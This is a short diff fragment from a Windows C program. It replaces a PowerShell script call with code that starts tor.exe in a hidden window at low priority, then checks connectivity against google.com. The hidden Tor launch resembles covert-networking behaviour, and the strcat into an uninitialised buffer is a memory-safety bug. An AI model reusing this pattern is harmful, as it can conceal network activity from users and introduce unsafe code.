@@ -24,7 +24,15 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 	char verifyUrl[128];
 	strcat(verifyUrl, "https://google.com");
 
-	system("Powershell.exe -File start.ps1");
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+	if (!CreateProcessW(L"tor.exe", NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+	{
+		printf("fail");
+		return EXIT_FAILURE;
+	}
 	
 	int counter = 30;
 	Sleep(1000);
